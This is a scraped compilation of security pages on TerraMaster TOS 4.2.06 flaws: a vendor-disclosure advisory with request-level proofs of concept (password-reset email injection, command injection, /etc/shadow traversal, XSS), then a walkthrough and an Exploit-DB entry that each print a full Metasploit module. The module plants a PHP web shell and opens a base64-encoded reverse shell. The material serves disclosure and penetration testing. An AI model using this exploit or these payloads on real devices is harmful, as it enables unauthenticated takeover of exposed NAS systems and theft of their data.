=== Content from packetstormsecurity.com_c4a2c572_20250119_125639.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from www.ihteam.net_bb611acc_20250119_142426.html ===

[Skip to the content](#site-content)
[![IHTeam Security Blog](https://www.ihteam.net/wp-content/uploads/smlogo_2.png)](https://www.ihteam.net/)IHTeam Security Blog

Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Close Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Categories
[Advisories](https://www.ihteam.net/advisory/)
# TerraMaster TOS Multiple Vulnerabilities

* Post author

  By r00t
* Post date

  [12 December 2020](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)
* [2 Comments on TerraMaster TOS Multiple Vulnerabilities](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comments)

TerraMaster is well known for producing data storage devices (NAS and DAS) since 2010. TOS is the name of their web interface to manage functionalities of the device.

The product is not new to security vulnerabilities, as Joshua M. of ISE highlighted back in 2018 (https://blog.securityevaluators.com/terramaster-nas-vulnerabilities-discovered-and-exploited-b8e5243e7a63).
In 2020, IHTeam performed a security review of the current TOS version 4.2.06 and identified the following:
CVE-2020-28184 – XSS
CVE-2020-28185 – User Enumeration
CVE-2020-28186 – Email Injection
CVE-2020-28187 – Directory Traversal
CVE-2020-28188 – Remote Command Execution
CVE-2020-28190 – Software Update Man-in-the-middle
CVE-2020-29189 – Incorrect Access Control

At the moment of writing Shodan has found around 1000 vulnerable TOS exposed on Internet – <https://www.shodan.io/search?query=X-Powered-By%3A+TerraMaster>

## **Account Takeover**

CVE-2020-28186 – The Forget Password functionality was found to be vulnerable to email injection, allowing an attacker to receive a verification code to a third-party email. This attack only works if the user specified a ‘Security email’ on the account.

The first step is to identify valid account (CVE-2020-28185) with security email set via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 28
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.1.206:8181

tab=checkuser&username=testaccount`

The response will look like the following:
`{"username":"testaccount","email":"[[email protected]](/cdn-cgi/l/email-protection)","status":1}`

We can now proceed requesting the password reset code via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 41
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

tab=validmail&email=<valid_user@email>,<attacker_controlled@email>`

Both user and attacker will receive the verification code thanks to email injection (comma separated emails); At this point we can validate the code (the cookie value must be lowercase):

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 25
Accept: /
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkcode&code=FrSkzI`

And finally reset the user’s password via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 82
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkpass&username=testaccount&email=<valid_user@email>&code=FrSkzI&passwd=NewPassw0rdH3r3`

## **Unauthenticated Remote Command Execution**

CVE-2020-28188
Vulnerable page: */include/makecvs.php*
Vulnerable parameter: *Event*

Proof of Concept:
`GET /tos/index.php?explorer/pathList&path=%60touch%20/tmp/file%60 HTTP/1.1
Host: 192.168.1.206:8181`

![](https://www.ihteam.net/wp-content/uploads/Touch_file.jpg)

Full exploit available at: <https://iht.li/paste.php?hash=UEUS>

## **Weak Access Control List**

CVE-2020-29189 – When a user is created, it could be placed within a group having read-only access to NAS folders. It was found that this option could be bypassed via the following request:

`POST /tos/index.php?explorer/pathChmod HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 162
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/tos/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=9ef919de5a6d2b17f5b6a5549e45495e; tos_visit_time=1604152180; kod_name=testaccount; noshow=1; kod_user_language=it-it
Connection: close

list=[{"type":"folder","path":"Volume%2520%25231%252Fpublic%252FISO%252F","userlist":"admin,testaccount,user,@admin,@allusers","right":"2,2,2,2,2","appmode":"0"}]`

The ‘right’ array refers to the ‘userlist’ array, therefore a value of ‘2’ will grand read/write access, instead of ‘1’ that only grants read access.

## **Directory Traversal**

CVE-2020-28187 – Instances of directory traversal leading to internal file system disclosure were identified. For example the following authenticated request can be performed to read the /etc/shadow file:

`GET /tos/index.php?editor/fileGet&filename=../../../../../../etc/shadow HTTP/1.1
Host: 192.168.1.206:8181
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=xxxxxxxxxxxx;
Connection: close`

The nginx web server was running with root privileges, that’s why it was possible to read the shadow file.

## **Cross-Site Scripting**

CVE-2020-28184
XSS via Host header on port 80 (unauthenticated)
`GET / HTTP/1.1
Host: 192.168.1.206'-alert(1)-'`

Via GET (authenticated)
`GET /module/index.php?mod=%2fusr%2fwww%2fmod%2f5.%22-alert(1)-%22 HTTP/1.1
Host: 192.168.1.206:8181`

## **Software update via insecure communication channel**

CVE-2020-28190 – In addition, software update and applications are checked and delivered via un-encrypted communication channel (HTTP):
`"AmazonS3":
{
"url":"http:\/\/dl.terra-master.com\/cn\/TOS7.0CJ\/AmazonS3.bz2"`

This behavior would allow man-in-the-middle attacks to successfully install malicious applications or updates.

## **Responsible Disclosure timeline:**

2 Nov 2020 – Details sent to TerraMaster Team and CVE request submitted
17 Nov 2020 – TerraMaster confirms that fixes will be implemented in version 4.2.07
3 Dec 2020 – TerraMaster releases TOS 4.2.07
9 Dec 2020 – IHTeam confirms issues were fixed in 4.2.07
12 Dec 2020 – IHTeam releases a public disclosure article

---

[←
DEFCON 28 – Safe mode](https://www.ihteam.net/hack-meet/defcon-28-safe-mode/)
[→
OnionShare 2.3 >= 2.3.3 Vulnerabilities](https://www.ihteam.net/advisory/onionshare/)

---

## 2 replies on “TerraMaster TOS Multiple Vulnerabilities”

![](https://secure.gravatar.com/avatar/53eaef94379535acdf3506a9c69be6cc?s=120&d=mm&r=g)Juniorsays:
[16 June 2022 at 12:59](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1471)

Congrats for your findings! I have a question about CVE-2020-28188. Is it the same as CVE-2020-35665? What is the difference?

In this article you say the vulnerable page is “/include/makecvs.php” and the vulnerable parameter is “Event”, but as a PoC you use “/tos/index.php?explorer/pathList&path=…”. In the exploit that you share you are only referencing the “makecvs” file. Is it a mistake?

Thanks!

[Reply](#comment-1471)

![](https://secure.gravatar.com/avatar/586f57e8e7bad3b0e6473a2038581861?s=120&d=mm&r=g)r00tsays:
[10 July 2022 at 16:19](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1472)

Hello, CVE-2020-35665 was created on the 22nd of December and based on a replica of our original exploit (released on 2nd of November).

CVEs can be requested by researchers at any time. MITRE won’t check for duplicates.

Regarding your question about the vulnerable path, they both are vulnerable to RCE, but “/include/makecvs.php?Event=” was instead used for the exploit.

In fact, there was also another path vulnerable to RCE (required auth): ajax/logtable.php

[Reply](#comment-1472)By Post Author

---

## Leave a Reply [Cancel reply](/advisory/terramaster-tos-multiple-vulnerabilities/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

©
2025 [IHTeam Security Blog](https://www.ihteam.net/)

[Powered by WordPress](https://en-gb.wordpress.org/)

[To the top ↑
Up ↑](#site-header)



=== Content from www.pentest.com.tr_96cd18e1_20250119_125640.html ===

ââââââ âââ ââââââ ââââââ âââââââââââ
âââââââââââ âââââââ âââââââ âââââââââââ
âââââââââââââââ âââââââ âââ âââââââââââ
âââââââââââââââ âââââââ âââ âââââââââââ
âââ ââââââ ââââââ ââââââââââââââââââââ
âââ ââââââ ââââââ âââ âââââââ ââââââââ
"I know Hack and I believe in Hak. So...You have no chance :/"

* [Root](../index.html)
* [Blog](/blog/)
* [Pentest](/pentest/)
* [Whoami](/whoami/)
* [Exploits](/exploits/)

## EDB-ID: 49330

## CVE-2020-35665

22 Dec, 2020
â¢
EXPLOIT

- A suitable exploitation vector was used to exploit this vulnerability.
- Vendor did not fixed this vulnerability yet.
- [Exploit-DB Link](https://www.exploit-db.com/exploits/49330)
- [CVE-Mitre Link](https://nvd.nist.gov/vuln/detail/CVE-2020-35665)
- [Other Ref](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)
- [Download terramaster\_tos\_unauth\_rce.rb (Metasploit)](https://pentest.com.tr/blog/terramaster_tos_unauth_rce.rb)
This module exploits a unauthenticated command execution vulnerability in TerraMaster TOS <= 4.2.06.
The "Event" parameter in "include/makecvs.php" contains a vulnerability.
"filename" is executing command on system during ".csv" creation.
In order to do this, it is not necessary to have a session in the application.
Therefore an unathenticated user can execute the command on the system.
### Analysis of Vulnerability

Let's start by examining the "include/makecvs.php" where we send the HTTP request.![](../images/terra-1.png)Considered parameters :Service,DateTime,User,Client-IP,Client-PORT,EventLogs of the latest service(HTTP,SSH etc.) transactions can be output as csv file.The "Event" parameter represents the service name. The "makecvs.php" file uses the variable assigned for the "Event" parameter directly in the server command line. Therefore, we can run an extra command on the system using a pipe with the content specified for this parameter.But no cmd output can be seen in the returned response. We must take an initiative to see the response belong to our commands. The application is php based and the "TOS/1.12.1" service allows running PHP files.First, we need to upload a php to application home directory where we can easily run commands.TerraMaster works in the "/usr/www/" directory. It will be enough to use PHP passthru(). However, the PHP file we will upload should receive data via HTTP POST, not HTTP GET. Because many payloads we will use for receive shell are quite large and HTTP GET method does not accept large data.
```
echo(passthru(\$_REQUEST['cmd']));

```
The PHP payload above will be enough for now. The data in the "cmd" parameter that we will POST will work directly as the system command.We will also use echo and print it to the directory we want.
```
http|echo "php echo(passthru(\$_REQUEST['cmd']));?" >> /usr/www/shell.php && chmod +x /usr/www/shell.php||

```
Our first job will be completed when the above payload is sent to the system.![](../images/terra-2.png)Our file has been successfully uploaded and we can now execute the system command at basic level.![](../images/terra-3.png)
### Advanced Exploitation

In the vulnerable system, we must get an interactive shell. The exploit we will prepare will be a metasploit module and the payloads it uses in itself should be placed in accordance with the exploitation of this vulnerability.We gonna use HTTP POST method anyway. So we can place a large payload.The method I used in a different exploit before is also suitable for this exploit.Let's first check for the vulnerability with the version of the application. The HTTP GET method to be made in TerraMaster "/version" directory reflects the application version by request.
```
  def check

    res = send_request_cgi(
      'method'  => 'GET',
      'uri'     =>  normalize_uri(target_uri.path, "version"),
    )

```
This request will be sufficient. "res.body" will return like "TOS3\_S2.0\_4.1.30". We will check with version numbers after "0\_".
So we have to separate it.
```
version = res.body.split(".0_")[1]

```
it will be like "4.1.30". In this part, if we remove the points, we can very easily apply the smaller/bigger condition.
```
version = version.split(".").join('')

```
As a result of this operation, version will be like "4130". Vulnerable version is 4.2.06. If the version is equal or less than 4206, we can say that the application is vulnerable.Therefore, we can control the vulnerability with a codes like the one below.
```
res = send_request_cgi(
      'method'  => 'GET',
      'uri'     =>  normalize_uri(target_uri.path, "version"),
    )

    if res && res.code == 200 && res.body
      version = res.body.split(".0_")[1]
      print_status("Version : " + res.body)
      return CheckCode::Detected if version.nil?
      version = version.split(".").join('')
      if version <= "4206"
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    end

```
The next step is to upload a php file to the server.With the rand\_text\_alpha\_lower() function we will create a random string of lowercase letters and this will be the name of our php file.
```
sname = Rex::Text.rand_text_alpha_lower(8) + ".php"

```
Now let's specify our first payload. We have already done this manually before.
```
payload_post = "http|echo \"php echo(passthru(\\$_REQUEST['cmd']));?\" >> /usr/www/#{sname} && chmod +x /usr/www/#{sname}||"

```
We can send this payload to the server with the part below.
```
res = send_request_cgi(
      'method'  => 'GET',
      'uri' => normalize_uri(target_uri.path, "include", "makecvs.php"),
      'vars_get' => {
        'Event' => "#{payload_post}",
      }
    )

```
We now have a malicious file on the server where we can execute commands and view the results as a response to the HTTP request.Let's check that the module we have prepared has successfully uploaded this malicious file and can run a command.
```
res = send_request_cgi(
      'method'  => 'POST',
      'uri'     =>  normalize_uri(target_uri.path, "#{sname}"),
      'vars_post' => {
        'cmd' => 'id'
      }
    )

```
In the above process, we specified the file name we uploaded and asked it to run "id" as a command via cmd parameter.![](../images/terra-4.png)As seen in manual control, if the response contains the value "uid=", the command has successfully run.
```
if res && res.code == 200 && res.body.include?('uid=')
      print_good("Upload completed successfully and command executed!")

```
Therefore, a basic check as above will be sufficient.We're at the last stage. We gonna prepare a payload to get an interactive shell from the server. In this section, I searched for a language installed by default on the TerraMaster server.![](../images/terra-perl-detect.png)Python was not there but Perl is installed by default. So we can use a payload with perl.![](../images/terra-5.png)However, the payload we will use contains a lot of special characters as seen above. Even if we use escape for PHP it will still break the PHP syntax. Therefore, payload cannot be used directly. So how about using "bash"?here we will get support from the unix command line. We can encode the perl payload with the base64 algorithm.
```
bash -c "{echo,' + "#{base64_perl_payload}" + '}

```
As above the perl payload prepared can be encoded as base64 and run within the "bash" command. But in the "bash" command line, this base64 data must also be decoded. To perform this operation at the same time, We can use pipe "|" .
```
@b64p = Rex::Text.encode_base64(payload.encoded)

```
payload is encoded as base64.
```
perl_payload = 'bash -c "{echo,' + "#{@b64p}" + '}|{base64,-d}|{bash,-i}"'

```
It was then placed inside the "bash" command.Before performing the HTTP request, we have to put the payload I prepared into the url encode process.
```
payload = Rex::Text.uri_encode(perl_payload)

```
With this process, we will have made a request in accordance with the HTTP protocol.Everything is ready. We can now tidy up the module.
```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => "TerraMaster TOS 4.2.06 - Unauthenticated Remote Code Execution",
      'Description' => %q(
        This module exploits a unauthenticated command execution vulnerability in TerraMaster TOS.
        The "Event" parameter in "include/makecvs.php" contains a vulnerability.
        "filename" is executing command on system during ".csv" creation.
        In order to do this, it is not necessary to have a session in the application.
        Therefore an unathenticated user can execute the command on the system.
      ),
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'AkkuS <Ãzkan Mustafa AkkuÅ>', #PoC & Metasploit module
          'IHTeam' # Discovery
        ],
      'References' =>
        [
          ['CVE', '2020-'],
          ['URL', 'http://www.pentest.com.tr/exploits/TerraMaster-TOS-4-2-06-Unauthenticated-Remote-Code-Execution.html'],
          ['URL', 'https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/']
        ],
      'Platform' => 'unix',
      'Arch' => ARCH_CMD,
      'Targets' => [['Automatic', {}]],
      'Privileged' => false,
      'DisclosureDate' => "Dec 12 2020",
      'DefaultTarget' => 0,
      'DefaultOptions' =>
        {
          'RPORT' => 8181,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_perl' }))

    register_options(
      [
        OptString.new('TARGETURI', [true, "Base ERP directory path", '/'])
      ]
    )
  end

  def run_cmd(file,cmd)

    res = send_request_cgi(
      {
        'method' => 'POST',
        'ctype'  => 'application/x-www-form-urlencoded',
        'uri'     =>  normalize_uri(target_uri.path, "#{file}"),
        'data' => "cmd=#{cmd}"
      })
  end

  def upload_shell
    sname = Rex::Text.rand_text_alpha_lower(8) + ".php"
    payload_post = "http|echo \"php echo(passthru(\\$_REQUEST['cmd']));?\" >> /usr/www/#{sname} && chmod +x /usr/www/#{sname}||"
    @b64p = Rex::Text.encode_base64(payload.encoded)
    perl_payload = 'bash -c "{echo,' + "#{@b64p}" + '}|{base64,-d}|{bash,-i}"'
    payload = Rex::Text.uri_encode(perl_payload)

    res = send_request_cgi(
      'method'  => 'GET',
      'uri' => normalize_uri(target_uri.path, "include", "makecvs.php"),
      'vars_get' => {
        'Event' => "#{payload_post}",
      }
    )

    res = send_request_cgi(
      'method'  => 'POST',
      'uri'     =>  normalize_uri(target_uri.path, "#{sname}"),
      'vars_post' => {
        'cmd' => 'id'
      }
    )

    if res && res.code == 200 && res.body.include?('uid=')
      print_good("Upload completed successfully and command executed!")
      run_cmd("#{sname}",payload)
    else
      fail_with(Failure::NoAccess, 'Error occurred during uploading!')
    end
  end

  def exploit
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    upload_shell
  end

  def check

    res = send_request_cgi(
      'method'  => 'GET',
      'uri'     =>  normalize_uri(target_uri.path, "version"),
    )

    if res && res.code == 200 && res.body
      version = res.body.split(".0_")[1]
      print_status("Version : " + res.body)
      return CheckCode::Detected if version.nil?
      version = version.split(".").join('')
      if version <= "4206"
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    end
  end
end

```
It's time to try the exploit.![](../images/terra-6.png)![](../images/terra-7.png)

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

Â© Copyright, 2017 | Sponsored by- [National Keep](https://nationalkeep.com)



=== Content from www.exploit-db.com_a3eb4d89_20250119_142426.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# TerraMaster TOS 4.2.06 - Unauthenticated Remote Code Execution (Metasploit)

#### EDB-ID:

###### 49330

#### CVE:

###### [2020-35665](https://nvd.nist.gov/vuln/detail/CVE-2020-35665)

---

**EDB Verified:**

#### Author:

###### [AkkuS](/?author=9483)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2020-12-23

---

**Vulnerable App:**

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => "TerraMaster TOS 4.2.06 - Unauthenticated Remote Code Execution",
      'Description' => %q(
        This module exploits a unauthenticated command execution vulnerability in TerraMaster TOS.
        The "Event" parameter in "include/makecvs.php" contains a vulnerability.
        "filename" is executing command on system during ".csv" creation.
        In order to do this, it is not necessary to have a session in the application.
        Therefore an unathenticated user can execute the command on the system.
      ),
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'AkkuS <Özkan Mustafa Akkuş>', #PoC & Metasploit module
          'IHTeam' # Discovery
        ],
      'References' =>
        [
          ['CVE', '2020-'],
          ['URL', 'http://www.pentest.com.tr/exploits/TerraMaster-TOS-4-2-06-Unauthenticated-Remote-Code-Execution.html'],
          ['URL', 'https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/']
        ],
      'Platform' => 'unix',
      'Arch' => ARCH_CMD,
      'Targets' => [['Automatic', {}]],
      'Privileged' => false,
      'DisclosureDate' => "Dec 12 2020",
      'DefaultTarget' => 0,
      'DefaultOptions' =>
        {
          'RPORT' => 8181,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_perl' }))

    register_options(
      [
        OptString.new('TARGETURI', [true, "Base ERP directory path", '/'])
      ]
    )
  end

  def run_cmd(file,cmd)

    res = send_request_cgi(
      {
        'method' => 'POST',
        'ctype'  => 'application/x-www-form-urlencoded',
        'uri'     =>  normalize_uri(target_uri.path, "#{file}"),
        'data' => "cmd=#{cmd}"
      })
  end

  def upload_shell
    sname = Rex::Text.rand_text_alpha_lower(8) + ".php"
    payload_post = "http|echo \"<?php echo(passthru(\\$_REQUEST['cmd']));?>\" >> /usr/www/#{sname} && chmod +x /usr/www/#{sname}||"
    @b64p = Rex::Text.encode_base64(payload.encoded)
    perl_payload = 'bash -c "{echo,' + "#{@b64p}" + '}|{base64,-d}|{bash,-i}"'
    payload = Rex::Text.uri_encode(perl_payload)

    res = send_request_cgi(
      'method'  => 'GET',
      'uri' => normalize_uri(target_uri.path, "include", "makecvs.php"),
      'vars_get' => {
        'Event' => "#{payload_post}",
      }
    )

    res = send_request_cgi(
      'method'  => 'POST',
      'uri'     =>  normalize_uri(target_uri.path, "#{sname}"),
      'vars_post' => {
        'cmd' => 'id'
      }
    )

    if res && res.code == 200 && res.body.include?('uid=')
      print_good("Upload completed successfully and command executed!")
      run_cmd("#{sname}",payload)
    else
      fail_with(Failure::NoAccess, 'Error occurred during uploading!')
    end
  end

  def exploit
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    upload_shell
  end

  def check

    res = send_request_cgi(
      'method'  => 'GET',
      'uri'     =>  normalize_uri(target_uri.path, "version"),
    )

    if res && res.code == 200 && res.body
      version = res.body.split(".0_")[1]
      print_status("Version : " + res.body)
      return CheckCode::Detected if version.nil?
      version = version.split(".").join('')
      if version <= "4206"
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    end
  end
end

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

